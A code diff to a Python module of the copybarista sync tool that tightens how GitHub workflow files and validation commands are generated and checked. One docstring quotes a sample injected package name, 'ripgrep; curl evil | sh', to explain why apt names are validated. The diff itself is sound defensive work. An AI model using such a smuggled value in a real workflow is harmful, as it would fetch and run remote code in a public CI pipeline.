@@ -10,12 +10,13 @@ from typing import Final, cast
 
 import json
 import keyword
+import re
 import shlex
 import tomllib
 
 import yaml
 
-from copybarista.config import DEFAULT_PYTHON_EXCLUDES, load_config
+from copybarista.config import load_config
 from copybarista.errors import ConfigError
 
 
@@ -28,11 +29,6 @@ CONTROL_EXCLUDES: Final = (
     "copy.barista.toml",
     "copybarista.sync.toml",
 )
-# Full exclude set rendered into a freshly generated `copy.barista.toml`: the
-# shared Python-artifact default plus the copybarista control files. The Python
-# subset is applied by default at export time even if a config omits it; it is
-# still rendered into new configs for readability and to document intent.
-DEFAULT_EXCLUDES: Final = DEFAULT_PYTHON_EXCLUDES + CONTROL_EXCLUDES
 CONTROL_CHAR_BOUND: Final = 32
 DEFAULT_SYNC_USER_NAME: Final = "copybarista"
 DEFAULT_SYNC_USER_EMAIL: Final = "copybarista@example.com"
@@ -114,7 +110,11 @@ class SyncSettings:
       forbidden_pr_text: Public PR title/body terms rejected before export.
       export_watch_paths: Additional source-repository paths that trigger export.
       validation_python_versions: Python versions used by public package validation.
-      validation_commands: Commands run by public package validation.
+      validation_commands: Commands run by public package validation. Every
+          entry executes; explanatory text belongs in the comment field below,
+          since a ``#``-leading entry here would silently never run.
+      validation_commands_comment: Lines rendered as YAML comments above the
+          validation command block.
       system_packages: apt packages installed before BOTH validation workflows.
           Both run the same test suite, so the same tools must be present in
           each; one setting renders into both workflows to prevent env drift.
@@ -149,6 +149,7 @@ class SyncSettings:
     release_check_script: str = ""
     validation_python_versions: tuple[str, ...] = DEFAULT_VALIDATION_PYTHON_VERSIONS
     validation_commands: tuple[str, ...] = ()
+    validation_commands_comment: tuple[str, ...] = ()
     system_packages: tuple[str, ...] = DEFAULT_SYSTEM_PACKAGES
     sync_user_name: str = DEFAULT_SYNC_USER_NAME
     sync_user_email: str = DEFAULT_SYNC_USER_EMAIL
@@ -171,10 +172,7 @@ class SyncSettings:
             object.__setattr__(
                 self,
                 "validation_commands",
-                _default_validation_commands(
-                    smoke_import=self.smoke_import,
-                    type_check_targets=self.type_check_targets,
-                ),
+                _default_validation_commands(smoke_import=self.smoke_import),
             )
         if not self.pr_default_title:
             object.__setattr__(
@@ -260,9 +258,13 @@ def load_sync_settings(path: Path) -> SyncSettings:
             sync,
             "validation_commands",
             default=_default_validation_commands(
-                smoke_import=_required_str(sync, "smoke_import"),
-                type_check_targets=_required_str_tuple(sync, "type_check_targets"),
+                smoke_import=_required_str(sync, "smoke_import")
             ),
+        ),
+        validation_commands_comment=_optional_str_tuple(
+            sync,
+            "validation_commands_comment",
+            default=(),
         ),
         refresh_public_lockfile=_optional_sync_bool(
             sync,
@@ -458,6 +460,15 @@ def sync_toml(settings: SyncSettings) -> str:
     commands = "\n".join(
         f"  {_toml_str(command)}," for command in settings.validation_commands
     )
+    commands_comment = "\n".join(
+        f"  {_toml_str(line)}," for line in settings.validation_commands_comment
+    )
+    packages = "\n".join(
+        f"  {_toml_str(package)}," for package in settings.system_packages
+    )
+    replay_comment = "\n".join(
+        f"  {_toml_str(line)}," for line in settings.replay_bootstrap_base_comment
+    )
     return _render_template(
         "copybarista.sync.toml.tmpl",
         {
@@ -472,8 +483,12 @@ def sync_toml(settings: SyncSettings) -> str:
             "COPYBARISTA_PROJECT_PATH": _toml_str(settings.copybarista_project_path),
             "SMOKE_IMPORT": _toml_str(settings.smoke_import),
             "RELEASE_CHECK_SCRIPT": _toml_str(settings.release_check_script),
-            "EXPORT_BRANCH_PREFIX": _toml_str(settings.export_prefix),
-            "IMPORT_BRANCH_PREFIX": _toml_str(settings.import_prefix),
+            # The RAW field, not the ``export_prefix``/``import_prefix``
+            # properties: those fall back to a value derived from the package
+            # name, so writing the resolved string freezes today's name into
+            # the config and a later rename would leave the prefix behind.
+            "EXPORT_BRANCH_PREFIX": _toml_str(settings.export_branch_prefix),
+            "IMPORT_BRANCH_PREFIX": _toml_str(settings.import_branch_prefix),
             "PR_DEFAULT_TITLE": _toml_str(settings.pr_default_title),
             "PR_DEFAULT_BODY": _toml_str(settings.pr_default_body),
             "REQUIRE_PR_METADATA": _toml_bool(settings.require_pr_metadata),
@@ -481,11 +496,15 @@ def sync_toml(settings: SyncSettings) -> str:
             "REPLAY_BOOTSTRAP_BASE": _toml_str(settings.replay_bootstrap_base),
             "PUBLISH_SOURCE_REV": _toml_bool(settings.publish_source_rev),
             "REFRESH_PUBLIC_LOCKFILE": _toml_bool(settings.refresh_public_lockfile),
+            "SKIP_SOURCE_VALIDATION": _toml_bool(settings.skip_source_validation),
+            "SYSTEM_PACKAGES": packages,
+            "REPLAY_BOOTSTRAP_BASE_COMMENT": replay_comment,
             "TYPE_CHECK_TARGETS": targets,
             "FORBIDDEN_PR_TEXT": forbidden,
             "EXPORT_WATCH_PATHS": export_watch_paths,
             "VALIDATION_PYTHON_VERSIONS": python_versions,
             "VALIDATION_COMMANDS": commands,
+            "VALIDATION_COMMANDS_COMMENT": commands_comment,
         },
     )
 
@@ -504,7 +523,13 @@ def package_validation_workflow(settings: SyncSettings) -> str:
 
     """
     _validate_settings(settings)
-    commands = _shell_script(settings.validation_commands, indent="          ")
+    commands = _shell_script(
+        (
+            *(f"# {line}" for line in settings.validation_commands_comment),
+            *settings.validation_commands,
+        ),
+        indent="          ",
+    )
     python_setup = (
         f"          python-version: {_yaml_str(settings.validation_python_versions[0])}"
         if len(settings.validation_python_versions) == 1
@@ -959,54 +984,21 @@ def _workflow_step_index(
 def _validate_package_validation_workflow_yaml(
     *, workflow_text: str, settings: SyncSettings
 ) -> None:
-    """Validate package CI matches generated sync validation commands."""
-    try:
-        parsed: object = yaml.safe_load(workflow_text)
-    except yaml.YAMLError as err:
-        raise ConfigError(f"Cannot read package validation workflow: {err}") from err
-    if not isinstance(parsed, dict):
-        raise ConfigError("package-validation.yml must be a YAML mapping.")
-    workflow = cast("dict[str, object]", parsed)
-    jobs = _yaml_mapping(workflow.get("jobs"), "jobs")
-    job = _yaml_mapping(jobs.get("validate"), "jobs.validate")
-    if job.get("name") != "Lint, type-check, test, and build":
-        raise ConfigError(
-            "package-validation.yml jobs.validate.name must be "
-            "'Lint, type-check, test, and build'."
-        )
-    if len(settings.validation_python_versions) == 1:
-        steps = _yaml_list(job.get("steps"), "jobs.validate.steps")
-        setup_step = _workflow_uses_step(steps, action_ref("actions/setup-python"))
-        with_config = _yaml_mapping(
-            setup_step.get("with"), "jobs.validate.steps.setup-python.with"
-        )
-        if with_config.get("python-version") != settings.validation_python_versions[0]:
-            raise ConfigError(
-                "package-validation.yml setup-python python-version must match "
-                "validation_python_versions."
-            )
-    else:
-        matrix = _yaml_mapping(
-            _yaml_mapping(job.get("strategy"), "jobs.validate.strategy").get("matrix"),
-            "jobs.validate.strategy.matrix",
-        )
-        if matrix.get("python-version") != list(settings.validation_python_versions):
-            raise ConfigError(
-                "package-validation.yml jobs.validate.strategy.matrix.python-version "
-                "must match validation_python_versions."
-            )
-    steps = _yaml_list(job.get("steps"), "jobs.validate.steps")
-    run = _workflow_step_run(steps, "Validate package")
-    commands = tuple(line.strip() for line in run.splitlines() if line.strip())
-    if commands != settings.validation_commands:
-        raise ConfigError(
-            "package-validation.yml Validate package commands must match "
-            "validation_commands."
-        )
-    _assert_installs_system_packages(
-        steps=steps,
-        packages=settings.system_packages,
-        workflow="package-validation.yml",
+    """Assert the workflow is byte-identical to what the generator produces.
+
+    This replaced a hand-listed field check (job name, python-version, the
+    command lines, apt packages). Such a check only catches what its author
+    enumerated, and the omissions were the whole security surface: ``on:``
+    triggers, ``permissions``, ``concurrency``, and ``runs-on`` all passed
+    unexamined, so a hand edit granting ``contents: write`` was accepted. The
+    export and import workflows were already guarded this way
+    (``sync_workflow_identity_test.py``); this closes the third file.
+    """
+    if workflow_text == package_validation_workflow(settings):
+        return
+    raise ConfigError(
+        "package-validation.yml is not what the generator produces; regenerate "
+        "it with `copybarista write-public-workflows <sync_config>`."
     )
 
 
@@ -1021,25 +1013,38 @@ def _assert_installs_system_packages(
     """
     if not packages:
         return
-    step_text = "\n".join(str(step) for step in steps)
+    # Parse the install step's argv rather than substring-searching every
+    # stringified step: the package name appearing in a comment, a step name,
+    # or as a substring of another package used to satisfy this check with no
+    # apt-get anywhere in the workflow.
+    installed = shlex.split(
+        _workflow_step_run(steps, "Install system packages", workflow=workflow)
+    )
     for package in packages:
-        if package not in step_text:
+        if package not in installed:
             raise ConfigError(
                 f"{workflow} must install system package {package!r} "
                 "(see system_packages)."
             )
 
 
-def _workflow_step_run(steps: list[object], name: str) -> str:
-    """Return the shell script for a named workflow step."""
+def _workflow_step_run(
+    steps: list[object], name: str, *, workflow: str = "sync-to-source.yml"
+) -> str:
+    """Return the shell script for a named workflow step.
+
+    ``workflow`` names the file in the error text: this helper serves both
+    generated workflows, and hardcoding one name sent operators debugging a
+    broken ``package-validation.yml`` to ``sync-to-source.yml`` instead.
+    """
     for step in steps:
-        step_map = _yaml_mapping(step, f"jobs.import-change.steps.{name}")
+        step_map = _yaml_mapping(step, f"{workflow} steps.{name}")
         if step_map.get("name") == name:
             run = step_map.get("run")
             if not isinstance(run, str):
-                raise ConfigError(f"sync-to-source.yml step {name} must define run.")
+                raise ConfigError(f"{workflow} step {name} must define run.")
             return run
-    raise ConfigError(f"sync-to-source.yml must define step {name}.")
+    raise ConfigError(f"{workflow} must define step {name}.")
 
 
 def _workflow_uses_step(steps: list[object], uses: str) -> dict[str, object]:
@@ -1140,19 +1145,23 @@ def _required_str_tuple(sync: dict[str, object], key: str) -> tuple[str, ...]:
     return tuple(value)
 
 
-def _default_validation_commands(
-    *, smoke_import: str, type_check_targets: tuple[str, ...]
-) -> tuple[str, ...]:
-    """Build the default exported-package validation command list."""
-    type_targets = " ".join(shlex.quote(target) for target in type_check_targets)
+def _default_validation_commands(*, smoke_import: str) -> tuple[str, ...]:
+    """Build the default exported-package validation command list.
+
+    The lint/type/test checks are delegated to the package's own
+    ``.pre-commit-config.yaml`` rather than restated here: restating them
+    means every added hook must be copied into this list too, and the copy
+    that gets forgotten is a check the public repo silently stops running.
+    Only the steps pre-commit does not own -- the environment sync, the
+    import smoke test, and the wheel build -- stay as explicit commands.
+
+    Which paths basedpyright checks is likewise the ``basedpyright-global``
+    hook's business, so ``type_check_targets`` is not a parameter here.
+    """
     return (
         "uv sync --all-groups",
-        "uv run ruff check --no-fix --no-cache .",
-        "uv run ruff format --check --no-cache .",
-        "uv run codespell .",
-        "uv run ty check",
-        f"uv run basedpyright {type_targets}",
-        "uv run pytest",
+        "uv run pre-commit run --all-files --hook-stage pre-commit",
+        "uv run pre-commit run --all-files --hook-stage pre-push",
         f'uv run python -c "import {smoke_import}"',
         "uv build",
     )
@@ -1182,13 +1191,36 @@ def _validate_settings(settings: SyncSettings) -> None:
         _validate_relative_path(path, name="export_watch_paths")
     _validate_python_module_name(settings.smoke_import, name="smoke_import")
     _validate_relative_path(settings.release_check_script, name="release_check_script")
+    for package in settings.system_packages:
+        _validate_apt_package(package, name="system_packages")
     if not settings.validation_python_versions:
         raise ConfigError("sync.validation_python_versions cannot be empty.")
+    # The floor is a published contract, not a per-package preference: every
+    # package declares requires-python >=3.12, so validating on anything newer
+    # leaves the supported floor untested and lets 3.13+-only syntax reach
+    # PyPI. A package may validate on ADDITIONAL versions, but must include
+    # the floor. Without this the constant's own docstring -- "check_sync_config
+    # rejects the mismatch" -- was aspirational.
+    floor = DEFAULT_VALIDATION_PYTHON_VERSIONS[0]
+    if floor not in settings.validation_python_versions:
+        raise ConfigError(
+            f"sync.validation_python_versions must include the published floor "
+            f"{floor!r}; got {settings.validation_python_versions!r}."
+        )
     if not settings.validation_commands:
         raise ConfigError("sync.validation_commands cannot be empty.")
     for command in settings.validation_commands:
         if "\n" in command or not command.strip():
             raise ConfigError("sync.validation_commands must contain shell commands.")
+        # A ``#``-leading entry renders as a comment and never executes, so a
+        # stray ``#`` (typo, merge artifact) would silently retire a real
+        # check while every byte-equality gate still passed. Comments belong
+        # in ``validation_commands_comment``, which renders above the block.
+        if command.lstrip().startswith("#"):
+            raise ConfigError(
+                "sync.validation_commands entries must be executable commands; "
+                "put explanatory text in sync.validation_commands_comment."
+            )
     if not settings.pr_default_title.strip():
         raise ConfigError(
             "copybarista.sync.toml [pull_request].default_title cannot be empty."
@@ -1209,6 +1241,22 @@ def _validate_settings(settings: SyncSettings) -> None:
         )
     _validate_branch_prefix(settings.export_prefix, name="export_branch_prefix")
     _validate_branch_prefix(settings.import_prefix, name="import_branch_prefix")
+
+
+def _validate_apt_package(value: str, *, name: str) -> None:
+    """Reject apt names that would not survive interpolation into a shell line.
+
+    ``_system_deps_step`` joins these straight into a workflow ``run:``, so a
+    value like ``ripgrep; curl evil | sh`` renders executable shell into a
+    workflow that ships to a public repository. Debian policy already limits
+    package names to lowercase alphanumerics plus ``+-.``, so the safe set
+    costs nothing.
+    """
+    if not re.fullmatch(r"[a-z0-9][a-z0-9+.-]*", value):
+        raise ConfigError(
+            f"sync.{name} entries must be Debian package names "
+            f"([a-z0-9][a-z0-9+.-]*); got {value!r}."
+        )
 
 
 def _validate_python_module_name(value: str, *, name: str) -> None:
